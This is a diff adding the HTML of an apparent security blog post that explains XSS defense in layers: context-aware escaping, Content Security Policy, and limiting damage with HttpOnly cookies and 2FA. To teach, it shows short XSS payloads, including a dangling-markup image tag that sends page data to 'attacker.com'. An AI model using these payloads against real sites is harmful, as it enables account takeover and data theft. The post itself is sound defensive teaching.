@@ -1,0 +1,582 @@
+<!DOCTYPE html>
+<html class="has-navbar-fixed-top" lang="en">
+<head>
+    <meta charset="utf-8">
+<title>A Brief Discussion on the Various Aspects of XSS Attacks and Defense - Huli&#39;s blog</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+
+            
+<link href="https://blog.huli.tw/2021/06/19/xss-attack-and-defense/" rel="alternate" hreflang="zh-TW" />
+            
+    
+
+
+
+
+<link rel="canonical" href="https://blog.huli.tw/2021/06/19/xss-attack-and-defense/">
+
+
+
+
+
+    <meta name="description" content="IntroductionWhen it comes to XSS (Cross-site scripting), many people may only think of “injecting code into a website”. However, if you think about it carefully, you will find that there are many aspe">
+<meta property="og:type" content="article">
+<meta property="og:title" content="A Brief Discussion on the Various Aspects of XSS Attacks and Defense">
+<meta property="og:url" content="https://blog.huli.tw/2021/06/19/en/xss-attack-and-defense/index.html">
+<meta property="og:site_name" content="Huli&#39;s blog">
+<meta property="og:description" content="IntroductionWhen it comes to XSS (Cross-site scripting), many people may only think of “injecting code into a website”. However, if you think about it carefully, you will find that there are many aspe">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog.huli.tw/img/xss-attack-and-defense/cover-en.png">
+<meta property="article:published_time" content="2021-06-19T03:23:27.000Z">
+<meta property="article:modified_time" content="2023-06-20T05:46:56.935Z">
+<meta property="article:author" content="Huli">
+<meta property="article:tag" content="Front-end">
+<meta property="article:tag" content="Security">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://blog.huli.tw/img/xss-attack-and-defense/cover-en.png">
+
+
+
+<link rel="alternative" href="/atom.xml" title="A Brief Discussion on the Various Aspects of XSS Attacks and Defense" type="application/atom+xml">
+
+
+
+<link rel="icon" href="/img/lidemy_logo.png">
+
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">
+
+
+<link rel="stylesheet" href="/css/bulma.css?v=2.css">
+
+
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.css" />
+
+
+<link rel="stylesheet" href="/css/style.css?v=3.css">
+
+
+
+
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-1393J2EVCZ"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-1393J2EVCZ');
+</script>
+
+
+    
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+    <script>
+        if (localStorage.getItem('dark-mode')) {
+            if (localStorage.getItem('dark-mode') === 'true') {
+                document.body.classList.add('dark-mode')
+            }
+        } else {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                document.body.classList.add('dark-mode')
+            }
+        }
+    </script>
+    
+<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
+    <div class="container">
+        <div class="navbar-brand">
+            <a class="navbar-item navbar-logo" href="/en">
+                
+                    
+                    Huli&#39;s blog
+                    
+                
+            </a>
+            <div class="navbar-burger">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+        
+        <div class="navbar-menu navbar-start">
+            
+            <a class="navbar-item "
+               href="/en/archives">Archive</a>
+            
+            <a class="navbar-item "
+               href="/en/categories">Categories</a>
+            
+            <a class="navbar-item "
+               href="/en/about">About</a>
+            
+        </div>
+        
+        <div class="navbar-menu navbar-end">
+            
+            
+            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
+                <a class="navbar-item" title="Table of Contents">
+                    Table of Contents
+                </a>
+                <div class="navbar-dropdown">
+                    
+                    
+                    
+                    
+                    <a class="navbar-item" href="#introduction">1&nbsp;&nbsp;<b>Introduction</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#first-level-preventing-attackers-from-injecting-code-into-the-website">2&nbsp;&nbsp;<b>First Level: Preventing Attackers from Injecting Code into the Website</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#second-level-preventing-malicious-code-from-being-executed">3&nbsp;&nbsp;<b>Second Level: Preventing Malicious Code from Being Executed</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#level-3-reduce-the-damage-of-xss-attacks">4&nbsp;&nbsp;<b>Level 3: Reduce the damage of XSS attacks</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#summary">5&nbsp;&nbsp;<b>Summary</b></a>
+                    
+                </div>
+            </div>
+            
+            
+            <a class="navbar-item" target="_blank" title="Twitter" href="https://twitter.com/aszx87410">
+                
+                <i class="fab fa-twitter"></i>
+                
+            </a>
+               
+            <a class="navbar-item" target="_blank" title="RSS" href="/atom.xml">
+                
+                <i class="fas fa-rss"></i>
+                
+            </a>
+               
+            
+            <a class="navbar-item btn-dark-mode" title="dark-mode" href="#">
+                <div>
+                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="15" height="15" viewBox="0 0 256 256" xml:space="preserve">
+                    <defs>
+                    </defs>
+                    <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)" >
+                        <path d="M 87.823 60.7 c -0.463 -0.423 -1.142 -0.506 -1.695 -0.214 c -15.834 8.398 -35.266 2.812 -44.232 -12.718 c -8.966 -15.53 -4.09 -35.149 11.101 -44.665 c 0.531 -0.332 0.796 -0.963 0.661 -1.574 c -0.134 -0.612 -0.638 -1.074 -1.259 -1.153 c -9.843 -1.265 -19.59 0.692 -28.193 5.66 C 13.8 12.041 6.356 21.743 3.246 33.35 S 1.732 57.08 7.741 67.487 c 6.008 10.407 15.709 17.851 27.316 20.961 C 38.933 89.486 42.866 90 46.774 90 c 7.795 0 15.489 -2.044 22.42 -6.046 c 8.601 -4.966 15.171 -12.43 18.997 -21.586 C 88.433 61.79 88.285 61.123 87.823 60.7 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: #ffa716; fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round" />
+                    </g>
+                    </svg>
+                </div>
+            </a>
+            
+               <a class="navbar-item" href="/2021/06/19/xss-attack-and-defense/">中文</a>
+            
+            
+
+        </div>
+    </div>
+</nav>
+
+    <section class="section">
+    <div class="container">
+      
+      <div data-nosnippet class="self-notice">
+        If you have any thoughts on my blog or articles and you want to let me know, you can either post a comment below(public) or tell me via this <a href="https://forms.gle/SjJZ4cnNs6NnjXQG8" target="_blank">feedback form</a>
+      </div>
+      
+    <article class="article content gallery" itemscope itemprop="blogPost">
+    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
+        
+            A Brief Discussion on the Various Aspects of XSS Attacks and Defense
+        
+    </h1>
+    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
+        <span class="column is-narrow">
+            <time datetime="2021-06-19T03:23:27.000Z" itemprop="datePublished">19 June 2021</time>
+        </span>
+        
+        <span class="column is-narrow article-category">
+            <i class="far fa-folder"></i>
+            <a class="article-category-link" href="/en/categories/Security/">Security</a>
+        </span>
+        
+        
+        
+        <spen data-nosnippet class="column is-narrow">(Translated by ChatGPT)</span>
+        
+    </div>
+    
+    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
+    
+        <h2><span id="introduction">Introduction</span></h2><p>When it comes to XSS (Cross-site scripting), many people may only think of “injecting code into a website”. However, if you think about it carefully, you will find that there are many aspects that can be further explored.</p>
+<p>These “aspects” can also be understood as different “levels”.</p>
+<p>For example, the first level is to prevent your website from being attacked by XSS, and not allowing attackers to inject code into the website. The act of “allowing attackers to inject code into the website” can be further divided into different types of injection, such as HTML injection, injection in HTML element attributes, or injection in JavaScript code. Each of these has different attack and defense methods.</p>
+<p>In addition to preventing code injection, the defender should also think further: “What if code injection does occur?”</p>
+<p>This is the second level. Although we have done our best to prepare for the first level, vulnerabilities may still occur. Therefore, it is not enough to defend the first level, and we must also defend the second level.</p>
+<p>Suppose an attacker has found a place to inject code. Can we find a way to prevent it from executing? This is where CSP (Content Security Policy) comes in, by setting some rules to prevent illegal code from executing. For example, inline JavaScript can be prevented from executing, making <code>&lt;img src=x onerror=alert(1)&gt;</code> ineffective.</p>
+<p>If the attacker is really skilled and can bypass the rules of CSP, then we enter the third level. The assumption of the third level is that the attacker can execute any code on the website.</p>
+<p>What can we defend against at this point? It is to try to minimize the damage.</p>
+<p>For example, for platforms like Medium, if an attacker can use XSS to take over someone else’s account, it is a serious vulnerability. Or, because Medium has a paywall feature, if an attacker can transfer money to their account through XSS, it will also be a serious problem.</p>
+<p>We must try to defend against these attacks under the premise of “the website has already been attacked by XSS”.</p>
+<p>Next, let’s take a look at the different defense methods for different levels.</p>
+<span id="more"></span>
+
+<h2><span id="first-level-preventing-attackers-from-injecting-code-into-the-website">First Level: Preventing Attackers from Injecting Code into the Website</span></h2><p>The first step in preventing XSS is to prevent attackers from injecting what they want into the website. The core spirit can be condensed into one sentence:</p>
+<blockquote>
+<p>Never trust user input.</p>
+</blockquote>
+<p>Validation should be done wherever there is input. When outputting untrusted data, escaping should be done.</p>
+<p>For example, if there is a place where users can set their own nickname, special attention should be paid when outputting the data here.</p>
+<p>If the user’s input is rendered directly without any modification, and the nickname entered by the user is <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>, anyone who browses this page will see an alert pop up because the input is executed as code.</p>
+<p>This attack can succeed because the user’s input becomes part of the code, causing unexpected behavior.</p>
+<p>To prevent this behavior, escaping should be done when rendering. For example, <code>&lt;</code> should be converted to <code>&amp;lt</code>, so that what is seen on the screen is still <code>&lt;</code>, but for the parser, it is not the symbol that starts the tag, but the <code>&lt;</code> of the text, which will not be parsed as an HTML tag.</p>
+<p>In this way, attackers can be prevented from injecting code.</p>
+<p>However, this is only a superficial understanding of escaping. What really needs to be noted is that different situations may require different ways of escaping, as discussed in these two articles:</p>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://www.ptt.cc/bbs/Soft_Job/M.1582437563.A.6F7.html">Re: [Discussion] Why are SQL injection and XSS vulnerabilities so rampant? (1)</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.ptt.cc/bbs/Soft_Job/M.1582441681.A.A7B.html">Re: [Discussion] Why are SQL injection and XSS vulnerabilities so rampant? (2)</a></li>
+</ol>
+<p>If you only think of escaping tags and escape <code>&lt;&gt;</code>, then it is indeed impossible to directly insert tags. However, what if the nickname is rendered like this?</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;?= avatar_url ?><span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;?= nickname ?><span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token prolog">&lt;?= nickname ?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>In addition to outputting the nickname in the div, the nickname is also rendered in the alt tag of the img. At this time, if you only escape <code>&lt;&gt;</code>, it is not enough, because if I make the nickname <code>&quot; onload=&quot;alert(1)</code>, it will become:</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>avatar_url<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>" onload="alert(1)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>Attackers can use <code>&quot;</code> to close the previous attribute and then create a new attribute <code>onload</code>, achieving XSS through HTML tag attribute manipulation.</p>
+<p>Therefore, common special characters such as <code>&quot;&#39;&lt;&gt;</code> need to be escaped to ensure defense effectiveness in different places. Many programming languages or frameworks have implemented this, such as PHP’s htmlspecialchars:</p>
+<p><img src="/img/xss-defense/xss1.png"></p>
+<p>Is that all we need to do? Not yet.</p>
+<p>Because the content in the link is another matter, for example: <code>&lt;a href=&quot;&lt;?= link ?&gt;&quot;&gt;my website&lt;/a&gt;</code></p>
+<p>There is something called JavaScript pseudo-protocol, which can use <code>javascript:</code> to execute JS code, like this: <code>&lt;a href=&quot;javascript:alert(1)&quot;&gt;my website&lt;/a&gt;</code>. When the user clicks on this link, an alert will pop up.</p>
+<p>And the characters <code>javascript:alert(1)</code> do not contain the special characters <code>&quot;&#39;&lt;&gt;&amp;</code> that we need to escape, so in this case, we need a different escape method or directly check the content and specify that the beginning must be <code>http://</code> or <code>http://</code>.</p>
+<p>This is what I just mentioned, different methods are needed to escape and defend in different places. If the same method is used, some places will be ineffective.</p>
+<p>Some people may say, “Don’t worry! The front-end framework I use has already done it for me, and it will escape by default! It won’t be XSS.”</p>
+<p>This claim is mostly correct. Nowadays, many front-end frameworks handle this, but pay special attention to the href example I just mentioned, because the characters <code>javascript:alert(1)</code> are not special characters, so they remain the same after escaping, and there are still vulnerabilities.</p>
+<p>React added a warning for this case in v16.9: <a target="_blank" rel="noopener" href="https://reactjs.org/blog/2019/08/08/react-v16.9.0.html#deprecating-javascript-urls">Deprecating javascript: URLs</a>, and will automatically block this behavior in later releases. However, according to test results, the current version v17.0.2 only warns and does not block.</p>
+<p>There are some related discussions: <a target="_blank" rel="noopener" href="https://github.com/facebook/react/issues/16592">React@16.9 block javascript:void(0); #16592</a> and <a target="_blank" rel="noopener" href="https://github.com/facebook/react/issues/16382">False-positive security precaution warning (javascript: URLs) #16382</a>, if you want to see the code, it is here: <a target="_blank" rel="noopener" href="https://github.com/facebook/react/blob/v17.0.2/packages/react-dom/src/shared/sanitizeURL.js">react&#x2F;packages&#x2F;react-dom&#x2F;src&#x2F;shared&#x2F;sanitizeURL.js </a>.</p>
+<p>In addition to understanding that escaping in different situations is not an easy task, it is not as simple as imagined to realize which parts are user-input.</p>
+<p>Because in addition to the database or API being your data source, the URL may also be. Some code directly puts a certain query string on the URL bar into JS, and then outputs this variable directly to the screen. This is unintentionally trusting data that should not be trusted.</p>
+<p>For example, the search page URL may look like this: <code>https://example.com/search?q=hello</code>, and it is written like this in the program:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> q <span class="token operator">=</span> <span class="token string">'hello'</span> <span class="token comment">// parameter taken from the URL bar</span>
+document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'.search'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> q<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>At this time, if you replace q with HTML: <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>, if you output it without escaping, an XSS vulnerability will occur.</p>
+<p>Finally, some websites allow some HTML content, the most common of which is blogs, because blogs need styles, unless it is a custom data format, some websites directly store the content as HTML, and then use <a target="_blank" rel="noopener" href="https://github.com/cure53/DOMPurify">DOMPurify</a> or <a target="_blank" rel="noopener" href="https://github.com/leizongmin/js-xss">js-xss</a> and other packages to filter out illegal tags or attributes.</p>
+<p>Although using these libraries is relatively safe, it is important to note that the versions must be updated regularly because these types of packages may also have vulnerabilities (<a target="_blank" rel="noopener" href="https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/">Mutation XSS via namespace confusion – DOMPurify &lt; 2.0.17 bypass</a>). In addition, it is also important to pay attention to the settings when using them, as incorrect settings may also cause problems. For actual cases, please refer to: <a target="_blank" rel="noopener" href="https://medium.com/cymetrics/prevent-xss-might-be-harder-than-you-thought-ce8c422540b">Prevent XSS Might Be Harder Than You Thought</a>.</p>
+<p>To summarize, to do a good job of preventing XSS attacks in the first level, the following things need to be considered:</p>
+<ol>
+<li>Be aware of where users can enter data themselves.</li>
+<li>Defend against XSS in different contexts.</li>
+</ol>
+<p>You can also consider introducing a ready-made <a target="_blank" rel="noopener" href="https://www.cloudflare.com/zh-tw/learning/ddos/glossary/web-application-firewall-waf/">WAF</a> (Web Application Firewall), which can directly block some suspicious payloads for you. However, WAF is not 100% effective, it is just an additional line of defense. Alternatively, you can also pay attention to this relatively new thing: <a target="_blank" rel="noopener" href="https://web.dev/trusted-types/">Trusted Types</a>.</p>
+<h2><span id="second-level-preventing-malicious-code-from-being-executed">Second Level: Preventing Malicious Code from Being Executed</span></h2><p>Assuming that the first level has been breached, attackers can insert arbitrary code on the website. At this point, the focus is on CSP, Content Security Policy.</p>
+<p>CSP is a series of rules used to tell the browser which sources of resources can be loaded and which cannot. It can be used to specify the CSP rules of a page using response headers or <code>&lt;meta&gt;</code> tags.</p>
+<p>For example, if I am sure that all the JS on the website comes from the same origin, then my CSP can be written like this:</p>
+<pre class="line-numbers language-none"><code class="language-none">Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><code>self</code> means same origin. If you try to load JS that is not from the current origin, or execute script directly on the page using inline, you will see a browser error:</p>
+<p><img src="/img/xss-defense/xss2.png"></p>
+<p>CSP can specify rules for many different resources. For a more detailed explanation, you can refer to <a target="_blank" rel="noopener" href="https://content-security-policy.com/">Content Security Policy Reference</a>. If you want to find a more complete CSP, it is fastest to look at the implementation of some large companies. Next, let’s take a look at what GitHub’s CSP looks like (reformatted for readability):</p>
+<pre class="line-numbers language-none"><code class="language-none">default-src &#39;none&#39;
+
+base-uri &#39;self&#39;;
+
+block-all-mixed-content;
+
+connect-src &#39;self&#39; uploads.github.com www.githubstatus.com collector.githubapp.com
+api.github.com github-cloud.s3.amazonaws.com github-production-repository-file-5c1aeb.s3.amazonaws.com
+github-production-upload-manifest-file-7fdce7.s3.amazonaws.com github-production-user-asset-6210df.s3.amazonaws.com
+html-translator.herokuapp.com cdn.optimizely.com logx.optimizely.com&#x2F;v1&#x2F;events wss:&#x2F;&#x2F;alive.github.com
+*.actions.githubusercontent.com wss:&#x2F;&#x2F;*.actions.githubusercontent.com online.visualstudio.com&#x2F;api&#x2F;v1&#x2F;locations
+insights.github.com;
+
+font-src github.githubassets.com;
+
+form-action &#39;self&#39; github.com gist.github.com;
+
+frame-ancestors &#39;none&#39;;
+
+frame-src render.githubusercontent.com;
+
+img-src &#39;self&#39; data: github.githubassets.com identicons.github.com collector.githubapp.com github-cloud.s3.amazonaws.com
+secured-user-images.githubusercontent.com&#x2F; *.githubusercontent.com;
+
+manifest-src &#39;self&#39;;
+
+media-src github.com user-images.githubusercontent.com&#x2F;;
+
+script-src github.githubassets.com;
+
+style-src &#39;unsafe-inline&#39; github.githubassets.com;
+
+worker-src github.com&#x2F;socket-worker-3f088aa2.js gist.github.com&#x2F;socket-worker-3f088aa2.js<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>To check if there are obvious vulnerabilities in the CSP rules, you can go to <a target="_blank" rel="noopener" href="https://csp-evaluator.withgoogle.com/">CSP Evaluator</a>. GitHub’s CSP is set very strictly, and almost every type of resource is set.</p>
+<p>Here you can see that the value of script-src is only <code>github.githubassets.com</code>. Because there is no <code>unsafe-inline</code>, inline script cannot be executed, and if you want to import script, you can only import it from the source of <code>github.githubassets.com</code>, which almost blocks the way to execute script.</p>
+<p>However, the CSP of many websites is not set so strictly, so there is a higher chance of being bypassed, such as <a target="_blank" rel="noopener" href="https://blog.orange.tw/2019/03/a-wormable-xss-on-hackmd.html">A Wormable XSS on HackMD!</a> directly using AngularJS + CSTI on cloudflare CDN to bypass it; <a target="_blank" rel="noopener" href="https://github.com/k1tten/writeups/blob/master/bugbounty_writeup/HackMD_XSS_%26_Bypass_CSP.md">HackMD Stored XSS &amp; Bypass CSP with Google Tag Manager</a> uses Google Tag Manager to bypass it.</p>
+<p>In addition, in some situations, even if it seems to be blocked, it can still be bypassed through existing scripts. For more information, please refer to this classic presentation: <a target="_blank" rel="noopener" href="https://github.com/google/security-research-pocs/tree/master/script-gadgets">Breaking XSS mitigations via Script gadgets</a>.</p>
+<p>What if the script cannot be executed? What else can be done?</p>
+<p>Even if only HTML is inserted, there are still things that can be done.</p>
+<p>For example, you can use the HTML meta tag to cause a redirect to a malicious website, like this: <code>&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;https://example.com&quot;&gt;</code>.</p>
+<p>Or insert <code>&lt;img src=&quot;https://attacker.com?q=</code> (note that only the opening double quotes are used here for src), so that the entire HTML becomes:</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://attacker.com?q=
+&lt;div>user info&lt;/div>
+&lt;div>sensitive data&lt;/div>
+&lt;div class=<span class="token punctuation">"</span></span><span class="token attr-name">test"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>By not closing the <code>&quot;</code> of src, you can get the HTML content until the next <code>&quot;</code> and pass it as part of the query string to the server, and there may be some sensitive data in between. Therefore, the <code>img-src</code> CSP rule is also useful, which can prevent this type of attack.</p>
+<p>Or you can combine <a href="https://blog.huli.tw/2021/01/23/dom-clobbering/">DOM Clobbering</a> to see if there are any places to attack.</p>
+<p>Therefore, even if scripts cannot be executed, there are still other attack methods that can be used.</p>
+<p>GitHub wrote a post in 2017 called <a target="_blank" rel="noopener" href="https://github.blog/2017-01-19-githubs-post-csp-journey/">GitHub’s post-CSP journey</a>, which specifically discussed how their CSP was designed to prevent known attacks. They even have a bug bounty called <a target="_blank" rel="noopener" href="https://bounty.github.com/targets/csp.html">GitHub CSP</a>, where you can get a reward just by proposing a method to bypass CSP, even if you don’t find an XSS.</p>
+<h2><span id="level-3-reduce-the-damage-of-xss-attacks">Level 3: Reduce the damage of XSS attacks</span></h2><p>If the previous two levels fail and XSS is inevitable, the next step is to consider how to reduce the damage of XSS attacks.</p>
+<p>I think there are two aspects to consider:</p>
+<ol>
+<li>Avoid attackers logging in as victims</li>
+<li>Avoid attackers performing more important operations through XSS</li>
+</ol>
+<p>First, let’s talk about the most common attack method, stealing cookies. After stealing the <code>document.cookie</code>, if the user’s authentication token is inside, the attacker can log in directly as the victim. Therefore, please remember to set <code>HttpOnly</code> for cookies used for authentication to ensure that the front-end cannot directly obtain the cookie using <code>document.cookie</code>.</p>
+<p>If for some reason it is not possible to protect the user’s token, other checkpoints can be set, such as the most common location check. Assuming a user has always been in Taiwan, but suddenly makes a request in Ukraine, this operation can be blocked first, and an email can be sent to inform the user of suspicious activity and ask them to confirm if it is them. Or you can check if the user’s browser is consistent. If it is inconsistent, you still need to confirm it and add another procedure to ensure the user’s safety.</p>
+<p>Next, even if the cookie is not stolen, because the attacker can execute arbitrary code, it is still possible to directly call the backend API, and the cookie will be automatically carried. Therefore, any operation that the user can do can basically be done by the attacker through XSS.</p>
+<p>For a blog platform, posting, editing articles, or deleting articles can all be done, so the attacker only needs to use XSS to call the API directly.</p>
+<p>At this time, for some more important operations, a second checkpoint should be set, such as changing the password requires entering the original password. This way, because the attacker does not know the original password, calling the API is useless. Or when transferring money, you need to receive a verification code on your phone, and if you don’t have a phone, you cannot perform the operation.</p>
+<p><img src="/img/xss-defense/xss3.png"></p>
+<p>In fact, to put it more simply, it is 2FA (Two-factor authentication). For these important operations, in addition to logging in, a second mechanism that can confirm the user’s identity should be set up. Even if XSS is executed, the attacker cannot perform these operations, which can reduce the damage.</p>
+<h2><span id="summary">Summary</span></h2><p>The world of information security is both wide and deep, and what is mentioned in this article is only an overview of the general direction. If you go deeper, each link can be turned into multiple independent topics, and can also be combined with other attacks, such as:</p>
+<ol>
+<li>Is it possible that the custom XSS filtering rules have vulnerabilities that can be bypassed? If so, how to bypass them?</li>
+<li>Even if everything is filtered, can server-side vulnerabilities actually help bypass them? For example, double encoding</li>
+<li>Is the CSP set strict enough? Are there any ready-made bypass methods?</li>
+<li>Is the 2FA mechanism fully implemented? Is the rate limit set properly? If not, will it be cracked by brute force?</li>
+<li>Is the password reset mechanism implemented correctly? Can someone else reset the password on behalf of the user?</li>
+</ol>
+<p>XSS is not as simple as all or nothing. Some websites may be XSS, but the scope of the impact is limited, while others may be able to easily change the user’s account password as soon as they are XSSed.</p>
+<p>When defending against XSS attacks, if only the first line of defense is considered and the only thought is “I need to escape the rendered content,” it can easily lead to the situation mentioned above. Either the entire website is secure and free from XSS attacks, or if even one XSS attack is successful, the entire website is compromised.</p>
+<p>Therefore, when defending against XSS attacks, it is important to pay attention to the different stages mentioned above and to implement multiple lines of defense for each stage. Even if an attacker can bypass the first line of defense, they may be blocked by the second line of defense, such as CSP, preventing the execution of JavaScript. Even if the second line of defense is breached, the third line of defense is still in place, reducing the impact of the XSS attack and preventing the compromise of user accounts due to a single vulnerability.</p>
+
+    
+    </div>
+    
+    <div class="columns is-variable is-1 is-multiline is-mobile">
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/en/tags/Front-end/">#Front-end</a></span>
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/en/tags/Security/">#Security</a></span>
+    
+    </div>
+    
+    
+    <div class="columns is-mobile is-multiline article-nav">
+        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
+            
+            <a href="/2021/07/03/en/xss-challenge-intigriti-june-review/">Intigriti June XSS Challenge Review</a>
+            
+        </span>
+        <span class="column is-12-mobile is-half-desktop  article-nav-next">
+            
+            <a href="/2021/06/12/en/paged-js-htmo-to-pdf-best-solution/">Creating HTML Web Pages Suitable for Printing as PDFs with Paged.js</a>
+            
+        </span>
+    </div>
+    
+</article>
+
+
+
+
+<div class="comments">
+    <h3 class="title is-4">Comments</h3>
+    <script src="https://utteranc.es/client.js"
+        repo="aszx87410/huli-blog"
+        issue-term="title"
+        theme="github-light"
+        crossorigin="anonymous"
+        async>
+</script>
+</div>
+
+    </div>
+</section>
+    <footer class="footer">
+    <div class="container">
+        <div class="columns content">
+            <div class="column is-narrow has-text-centered">
+                &copy; 2023 Huli&nbsp;
+                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
+                        target="_blank" rel="noopener" href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
+            </div>
+            <div class="column is-hidden-mobile"></div>
+
+            
+            <div class="column is-narrow">
+                <div class="columns is-mobile is-multiline is-centered">
+                
+                    
+                <a class="column is-narrow" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
+                    
+                    GitHub
+                    
+                </a>
+                
+                </div>
+            </div>
+            
+            
+<div class="column is-narrow has-text-centered">
+    <div class="dropdown is-up is-right is-hoverable" style="margin-top: -0.2em;">
+        <div class="dropdown-trigger">
+            <button class="button is-small" aria-haspopup="true">
+                <span class="icon">
+                    <i class="fas fa-globe"></i>
+                </span>
+                <span>English</span>
+                <span class="icon is-small">
+            <i class="fas fa-angle-down" aria-hidden="true"></i>
+          </span>
+            </button>
+        </div>
+        <div class="dropdown-menu has-text-left" role="menu" style="top:100%">
+            <div class="dropdown-content">
+            <!-- NOTE: 永遠回到首頁 -->
+            
+                <a href="/2021/06/19/xss-attack-and-defense/" class="dropdown-item">
+                    繁體中文
+                </a>
+            
+            </div>
+        </div>
+    </div>
+</div>
+
+        </div>
+    </div>
+</footer>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
+
+
+
+    
+    
+    
+    
+    
+    
+<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
+<script>
+    (function ($) {
+        $(document).ready(function () {
